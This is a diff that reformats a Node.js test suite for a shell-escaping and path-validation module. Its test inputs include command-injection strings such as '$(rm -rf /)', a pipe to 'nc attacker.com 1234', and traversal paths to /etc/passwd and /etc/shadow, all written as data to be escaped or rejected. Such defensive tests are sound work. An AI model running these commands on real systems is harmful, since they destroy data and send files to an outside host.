@@ -6,350 +6,376 @@
  * and symlink attack prevention. These are real production tests against the
  * shell-safe module, not local mocks.
  */
-import { test } from 'node:test';
-import assert from 'node:assert/strict';
-import { resolve, join, dirname, sep } from 'node:path';
-import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from 'node:fs';
-import { tmpdir, platform } from 'node:os';
-import { fileURLToPath } from 'node:url';
+import { test } from "node:test";
+import assert from "node:assert/strict";
+import { resolve, join, dirname, sep } from "node:path";
+import {
+  mkdtempSync,
+  mkdirSync,
+  writeFileSync,
+  symlinkSync,
+  rmSync,
+} from "node:fs";
+import { tmpdir, platform } from "node:os";
+import { fileURLToPath } from "node:url";
 import {
   shellEscape,
   sanitizePath,
   validatePathBoundary,
   resolveSafePath,
-  isPathSafe
-} from '../../../runtime/adapters/shell-safe.mjs';
+  isPathSafe,
+} from "../../../runtime/adapters/shell-safe.mjs";
 
 // ─── Test 1: Command injection attempt with command substitution ───
 
-test('shell-safety: reject command substitution $(command)', () => {
-  const malicious = 'file.txt; $(rm -rf /)';
+test("shell-safety: reject command substitution $(command)", () => {
+  const malicious = "file.txt; $(rm -rf /)";
   const quoted = shellEscape(malicious);
 
   // After escaping, the entire string should be literal, not executed
-  assert.ok(quoted.includes('rm -rf'), 'Dangerous content preserved literally');
-  assert.ok(quoted !== malicious, 'String should be escaped/quoted');
-  assert.ok(quoted.includes("'") || quoted.includes('"'), 'Should use quotes');
+  assert.ok(quoted.includes("rm -rf"), "Dangerous content preserved literally");
+  assert.ok(quoted !== malicious, "String should be escaped/quoted");
+  assert.ok(quoted.includes("'") || quoted.includes('"'), "Should use quotes");
 });
 
 // ─── Test 2: Command injection attempt with backticks ───
 
-test('shell-safety: reject command substitution with backticks', () => {
-  const malicious = 'data.txt`whoami`';
+test("shell-safety: reject command substitution with backticks", () => {
+  const malicious = "data.txt`whoami`";
   const quoted = shellEscape(malicious);
 
-  assert.ok(quoted !== malicious, 'Should be escaped');
+  assert.ok(quoted !== malicious, "Should be escaped");
   // When escaped with single quotes, backticks become literal text
-  assert.ok(quoted.includes("'"), 'Should be wrapped in quotes');
+  assert.ok(quoted.includes("'"), "Should be wrapped in quotes");
 });
 
 // ─── Test 3: Pipe-based command injection ───
 
-test('shell-safety: reject pipe command injection', () => {
-  const malicious = 'config | nc attacker.com 1234';
+test("shell-safety: reject pipe command injection", () => {
+  const malicious = "config | nc attacker.com 1234";
   const quoted = shellEscape(malicious);
 
-  assert.ok(quoted !== malicious, 'Should be escaped');
+  assert.ok(quoted !== malicious, "Should be escaped");
   // When properly escaped, the pipe becomes literal text
-  assert.ok(quoted.length > malicious.length, 'Escaping adds quotes/backslashes');
+  assert.ok(
+    quoted.length > malicious.length,
+    "Escaping adds quotes/backslashes",
+  );
 });
 
 // ─── Test 4: Path traversal attempt ───
 
-test('shell-safety: prevent path traversal ../', () => {
-  const traversal = '../../../etc/passwd';
+test("shell-safety: prevent path traversal ../", () => {
+  const traversal = "../../../etc/passwd";
   const sanitized = sanitizePath(traversal);
 
-  assert.ok(!sanitized.startsWith('..'), 'Should remove leading traversal');
-  assert.ok(!sanitized.includes('../'), 'Should not allow ../ sequences');
+  assert.ok(!sanitized.startsWith(".."), "Should remove leading traversal");
+  assert.ok(!sanitized.includes("../"), "Should not allow ../ sequences");
   // Result should be absolute or relative but not traversing up
 });
 
 // ─── Test 5: Null byte injection ───
 
-test('shell-safety: reject null byte injection', () => {
-  const malicious = 'file.txt\x00; rm -rf /';
+test("shell-safety: reject null byte injection", () => {
+  const malicious = "file.txt\x00; rm -rf /";
   const quoted = shellEscape(malicious);
 
   // Null byte should be handled safely (removed or escaped)
-  assert.ok(!quoted.includes('\x00'), 'Null bytes should be removed/escaped');
+  assert.ok(!quoted.includes("\x00"), "Null bytes should be removed/escaped");
 });
 
 // ─── Test 6: Quote escaping - single quotes ───
 
-test('shell-safety: escape single quotes correctly', () => {
+test("shell-safety: escape single quotes correctly", () => {
   const userInput = "it's-a-file.txt";
   const quoted = shellEscape(userInput);
 
-  assert.ok(quoted.length > userInput.length, 'Escaping should add characters');
+  assert.ok(quoted.length > userInput.length, "Escaping should add characters");
   // Single quotes inside single-quoted string need to be handled
 });
 
 // ─── Test 7: Quote escaping - double quotes ───
 
-test('shell-safety: escape double quotes correctly', () => {
+test("shell-safety: escape double quotes correctly", () => {
   const userInput = 'file-"quoted".txt';
   const quoted = shellEscape(userInput);
 
-  assert.ok(quoted.length > userInput.length, 'Escaping should add characters');
+  assert.ok(quoted.length > userInput.length, "Escaping should add characters");
 });
 
 // ─── Test 8: Environment variable injection ───
 
-test('shell-safety: prevent environment variable injection', () => {
-  const malicious = '$(echo $PASSWD)';
+test("shell-safety: prevent environment variable injection", () => {
+  const malicious = "$(echo $PASSWD)";
   const quoted = shellEscape(malicious);
 
   // Should be quoted as literal string, not interpolated
-  assert.ok(quoted !== malicious, 'Should be escaped');
+  assert.ok(quoted !== malicious, "Should be escaped");
 });
 
 // ─── Test 9: Newline injection ───
 
-test('shell-safety: handle newline injection', () => {
-  const malicious = 'file.txt\nrm -rf /';
+test("shell-safety: handle newline injection", () => {
+  const malicious = "file.txt\nrm -rf /";
   const quoted = shellEscape(malicious);
 
   // Newlines should be escaped or quoted to prevent multi-line commands
-  assert.ok(!quoted.includes('\n') || quoted.match(/\\n|'[^']*\n[^']*'/), 'Newlines should be safe');
+  assert.ok(
+    !quoted.includes("\n") || quoted.match(/\\n|'[^']*\n[^']*'/),
+    "Newlines should be safe",
+  );
 });
 
 // ─── Test 10: Glob expansion prevention ───
 
-test('shell-safety: prevent glob expansion *.txt', () => {
-  const glob = 'dir/*.txt';
+test("shell-safety: prevent glob expansion *.txt", () => {
+  const glob = "dir/*.txt";
   const quoted = shellEscape(glob);
 
-  assert.ok(quoted.length > glob.length, 'Glob should be escaped');
+  assert.ok(quoted.length > glob.length, "Glob should be escaped");
   // When quoted, *.txt becomes literal, not expanded
 });
 
 // ─── Test 11: Path with spaces ───
 
-test('shell-safety: handle paths with spaces correctly', () => {
-  const pathWithSpaces = '/path/to/my file.txt';
+test("shell-safety: handle paths with spaces correctly", () => {
+  const pathWithSpaces = "/path/to/my file.txt";
   const quoted = shellEscape(pathWithSpaces);
 
-  assert.ok(quoted.length > pathWithSpaces.length, 'Should be quoted/escaped');
+  assert.ok(quoted.length > pathWithSpaces.length, "Should be quoted/escaped");
   // Spaces should not break the path
 });
 
 // ─── Test 12: Symlink attack - absolute path from untrusted source ───
 
-test('shell-safety: validate symlink targets', () => {
-  const untrustedTarget = '/etc/shadow';
-  const isPathAllowed = validatePathBoundary(untrustedTarget, '/home/user');
+test("shell-safety: validate symlink targets", () => {
+  const untrustedTarget = "/etc/shadow";
+  const isPathAllowed = validatePathBoundary(untrustedTarget, "/home/user");
 
-  assert.equal(isPathAllowed, false, 'Should reject paths outside boundary');
+  assert.equal(isPathAllowed, false, "Should reject paths outside boundary");
 });
 
 // ─── Test 13: Symlink attack - relative symlink escape ───
 
-test('shell-safety: prevent relative symlink escapes', () => {
-  const relativeEscape = '../../../../etc/passwd';
-  const isPathAllowed = validatePathBoundary(relativeEscape, '/home/user/project');
+test("shell-safety: prevent relative symlink escapes", () => {
+  const relativeEscape = "../../../../etc/passwd";
+  const isPathAllowed = validatePathBoundary(
+    relativeEscape,
+    "/home/user/project",
+  );
 
-  assert.equal(isPathAllowed, false, 'Should reject paths escaping boundary');
+  assert.equal(isPathAllowed, false, "Should reject paths escaping boundary");
 });
 
 // ─── Test 14: Allowed path within boundary ───
 
-test('shell-safety: allow paths within boundary', () => {
-  const allowedPath = './config/settings.json';
+test("shell-safety: allow paths within boundary", () => {
+  const allowedPath = "./config/settings.json";
   // Assuming boundary is current project directory
-  const isPathAllowed = validatePathBoundary(allowedPath, '/home/user/project');
+  const isPathAllowed = validatePathBoundary(allowedPath, "/home/user/project");
 
-  assert.equal(isPathAllowed, true, 'Should allow paths within boundary');
+  assert.equal(isPathAllowed, true, "Should allow paths within boundary");
 });
 
 // ─── Test 15: Wildcards in non-glob contexts ───
 
-test('shell-safety: escape wildcards in filenames', () => {
-  const filename = 'report[2024].txt';
+test("shell-safety: escape wildcards in filenames", () => {
+  const filename = "report[2024].txt";
   const quoted = shellEscape(filename);
 
-  assert.ok(quoted.length > filename.length, 'Wildcards should be escaped');
+  assert.ok(quoted.length > filename.length, "Wildcards should be escaped");
   // Brackets should not trigger glob expansion
 });
 
 // ─── Test 16: Windows-style backslash traversal ───
 
-test('shell-safety: reject Windows-style ..\\  traversal', () => {
+test("shell-safety: reject Windows-style ..\\  traversal", () => {
   assert.equal(
-    validatePathBoundary('..\\etc\\passwd', '/home/user'),
+    validatePathBoundary("..\\etc\\passwd", "/home/user"),
     false,
-    'Should reject ..\\  at start'
+    "Should reject ..\\  at start",
   );
 });
 
 // ─── Test 17: Embedded backslash traversal ───
 
-test('shell-safety: reject embedded backslash traversal', () => {
+test("shell-safety: reject embedded backslash traversal", () => {
   assert.equal(
-    validatePathBoundary('foo\\..\\..\\etc\\passwd', '/home/user'),
+    validatePathBoundary("foo\\..\\..\\etc\\passwd", "/home/user"),
     false,
-    'Should reject \\..\\  in middle of path'
+    "Should reject \\..\\  in middle of path",
   );
 });
 
 // ─── Test 18: Mixed separator traversal ───
 
-test('shell-safety: reject mixed separator traversal', () => {
+test("shell-safety: reject mixed separator traversal", () => {
   assert.equal(
-    validatePathBoundary('foo\\..\\/etc/passwd', '/home/user'),
+    validatePathBoundary("foo\\..\\/etc/passwd", "/home/user"),
     false,
-    'Should reject mixed \\../ traversal'
+    "Should reject mixed \\../ traversal",
   );
 });
 
 // ─── Test 19: Valid relative path with backslash ───
 
-test('shell-safety: allow valid relative path with backslash', () => {
+test("shell-safety: allow valid relative path with backslash", () => {
   assert.equal(
-    validatePathBoundary('subdir\\file.txt', '/home/user'),
+    validatePathBoundary("subdir\\file.txt", "/home/user"),
     true,
-    'Should allow backslash paths that stay within boundary'
+    "Should allow backslash paths that stay within boundary",
   );
 });
 
 // ─── Test 20: validatePathBoundary sibling-prefix bypass ───
 
-test('shell-safety: reject sibling-prefix path', () => {
+test("shell-safety: reject sibling-prefix path", () => {
   // Use resolve() to get platform-specific absolute paths
-  const boundary = resolve('/home/user');
-  const sibling = resolve('/home/user-evil/file.txt');
+  const boundary = resolve("/home/user");
+  const sibling = resolve("/home/user-evil/file.txt");
 
   assert.equal(
     validatePathBoundary(sibling, boundary),
     false,
-    'Sibling path with shared prefix must be rejected'
+    "Sibling path with shared prefix must be rejected",
   );
 });
 
 // ─── Test 21: resolveSafePath sibling-prefix bypass ───
 
-test('shell-safety: resolveSafePath rejects sibling-prefix path', () => {
-  const boundary = resolve('/home/user');
-  const sibling = resolve('/home/user-evil/file.txt');
+test("shell-safety: resolveSafePath rejects sibling-prefix path", () => {
+  const boundary = resolve("/home/user");
+  const sibling = resolve("/home/user-evil/file.txt");
   const result = resolveSafePath(sibling, boundary);
-  assert.equal(result, null, 'Sibling path with shared prefix must return null');
+  assert.equal(
+    result,
+    null,
+    "Sibling path with shared prefix must return null",
+  );
 });
 
 // ─── Test 22: resolveSafePath allows valid child paths ───
 
-test('shell-safety: resolveSafePath allows child paths', () => {
-  const boundary = resolve('/home/user');
-  const result = resolveSafePath('subdir/file.txt', boundary);
-  assert.ok(result !== null, 'Valid child path should resolve');
+test("shell-safety: resolveSafePath allows child paths", () => {
+  const boundary = resolve("/home/user");
+  const result = resolveSafePath("subdir/file.txt", boundary);
+  assert.ok(result !== null, "Valid child path should resolve");
   // Check that result is contained within boundary by comparing resolved paths
   const expectedPrefix = boundary + sep;
-  assert.ok(result.startsWith(expectedPrefix), `Resolved path ${result} should start with ${expectedPrefix}`);
+  assert.ok(
+    result.startsWith(expectedPrefix),
+    `Resolved path ${result} should start with ${expectedPrefix}`,
+  );
 });
 
 // ─── Test 23: resolveSafePath rejects traversal ───
 
-test('shell-safety: resolveSafePath rejects traversal', () => {
-  const boundary = resolve('/home/user');
-  const result = resolveSafePath('../../etc/passwd', boundary);
-  assert.equal(result, null, 'Traversal path must return null');
+test("shell-safety: resolveSafePath rejects traversal", () => {
+  const boundary = resolve("/home/user");
+  const result = resolveSafePath("../../etc/passwd", boundary);
+  assert.equal(result, null, "Traversal path must return null");
 });
 
 // ─── Test 24: isPathSafe rejects sibling-prefix paths ───
 
-test('shell-safety: isPathSafe rejects sibling-prefix path', () => {
-  const boundary = resolve('/home/user');
-  const sibling = resolve('/home/user-evil/file.txt');
+test("shell-safety: isPathSafe rejects sibling-prefix path", () => {
+  const boundary = resolve("/home/user");
+  const sibling = resolve("/home/user-evil/file.txt");
   assert.equal(
     isPathSafe(sibling, boundary),
     false,
-    'Sibling path with shared prefix must be rejected'
+    "Sibling path with shared prefix must be rejected",
   );
 });
 
 // ─── Test 25: isPathSafe allows exact boundary ───
 
-test('shell-safety: isPathSafe allows exact boundary path', () => {
+test("shell-safety: isPathSafe allows exact boundary path", () => {
   // Use the test file's own directory, which definitely exists
   const boundary = dirname(fileURLToPath(import.meta.url));
   assert.equal(
     isPathSafe(boundary, boundary),
     true,
-    'Exact boundary path should be allowed'
+    "Exact boundary path should be allowed",
   );
 });
 
 // ─── Test 26: isPathSafe rejects path outside boundary ───
 
-test('shell-safety: isPathSafe rejects path outside boundary', () => {
-  const boundary = resolve('/home/user');
-  const outside = resolve('/etc/passwd');
+test("shell-safety: isPathSafe rejects path outside boundary", () => {
+  const boundary = resolve("/home/user");
+  const outside = resolve("/etc/passwd");
   assert.equal(
     isPathSafe(outside, boundary),
     false,
-    'Path outside boundary must be rejected'
+    "Path outside boundary must be rejected",
   );
 });
 
 // ─── Test 27: validatePathBoundary allows exact boundary ───
 
-test('shell-safety: validatePathBoundary allows exact boundary', () => {
-  const boundary = resolve('/home/user');
+test("shell-safety: validatePathBoundary allows exact boundary", () => {
+  const boundary = resolve("/home/user");
   assert.equal(
     validatePathBoundary(boundary, boundary),
     true,
-    'Exact boundary path should be allowed'
+    "Exact boundary path should be allowed",
   );
 });
 
 // ─── Test 28: resolveSafePath rejects null bytes ───
 
-test('shell-safety: resolveSafePath rejects null bytes', () => {
-  const result = resolveSafePath('file\x00.txt', '/home/user');
-  assert.equal(result, null, 'Path with null bytes must return null');
+test("shell-safety: resolveSafePath rejects null bytes", () => {
+  const result = resolveSafePath("file\x00.txt", "/home/user");
+  assert.equal(result, null, "Path with null bytes must return null");
 });
 
 // ─── Test 29: isPathSafe accepts child path when boundary has trailing separator ───
 
-test('shell-safety: isPathSafe accepts child when boundary has trailing separator', () => {
+test("shell-safety: isPathSafe accepts child when boundary has trailing separator", () => {
   // isPathSafe must resolve() the boundary before comparison so a trailing
   // slash does not cause a false negative.
-  const boundary = resolve('/home/user/project') + sep;   // non-canonical input
-  const child    = resolve('/home/user/project/sub/file.txt');
+  const boundary = resolve("/home/user/project") + sep; // non-canonical input
+  const child = resolve("/home/user/project/sub/file.txt");
   assert.equal(
     isPathSafe(child, boundary),
     true,
-    'Boundary with trailing separator should still accept contained child paths'
+    "Boundary with trailing separator should still accept contained child paths",
   );
 });
 
 // ─── Test 30: isPathSafe accepts logically identical paths containing . segments ───
 
-test('shell-safety: isPathSafe accepts path with . segments matching boundary', () => {
+test("shell-safety: isPathSafe accepts path with . segments matching boundary", () => {
   // resolve() on both sides must collapse . segments before containment check.
-  const boundary = resolve('/home/user/project');
-  const withDots  = '/home/user/project/sub/../file.txt';  // non-canonical form
+  const boundary = resolve("/home/user/project");
+  const withDots = "/home/user/project/sub/../file.txt"; // non-canonical form
   assert.equal(
     isPathSafe(withDots, boundary),
     true,
-    'Path with . segments that resolves inside boundary should be accepted'
+    "Path with . segments that resolves inside boundary should be accepted",
   );
 });
 
 // ─── Test 31: isPathSafe rejects any symlink encountered in the path ───
 
-test('shell-safety: isPathSafe rejects symlink in path (filesystem-backed)', (t) => {
-  const tmp = mkdtempSync(join(tmpdir(), 'shell-safe-sym-'));
+test("shell-safety: isPathSafe rejects symlink in path (filesystem-backed)", (t) => {
+  const tmp = mkdtempSync(join(tmpdir(), "shell-safe-sym-"));
   try {
     // Create: tmp/real.txt  and  tmp/sub/link.txt -> tmp/real.txt
-    writeFileSync(join(tmp, 'real.txt'), 'data');
-    mkdirSync(join(tmp, 'sub'));
+    writeFileSync(join(tmp, "real.txt"), "data");
+    mkdirSync(join(tmp, "sub"));
 
     // Try to create symlink; skip test gracefully if not supported (e.g., Windows without admin)
     try {
-      symlinkSync(join(tmp, 'real.txt'), join(tmp, 'sub', 'link.txt'));
+      symlinkSync(join(tmp, "real.txt"), join(tmp, "sub", "link.txt"));
     } catch (err) {
-      if (err.code === 'EACCES' || err.code === 'EPERM' || err.code === 'ENOTSUP') {
-        t.skip('symlink creation not permitted on this platform');
+      if (
+        err.code === "EACCES" ||
+        err.code === "EPERM" ||
+        err.code === "ENOTSUP"
+      ) {
+        t.skip("symlink creation not permitted on this platform");
         return;
       }
       throw err;
@@ -357,9 +383,9 @@ test('shell-safety: isPathSafe rejects symlink in path (filesystem-backed)', (t)
 
     // The path passes through sub/link.txt which is a symlink — must be rejected.
     assert.equal(
-      isPathSafe(join(tmp, 'sub', 'link.txt'), tmp),
+      isPathSafe(join(tmp, "sub", "link.txt"), tmp),
       false,
-      'Any symlink in the path must be rejected'
+      "Any symlink in the path must be rejected",
     );
   } finally {
     rmSync(tmp, { recursive: true, force: true });
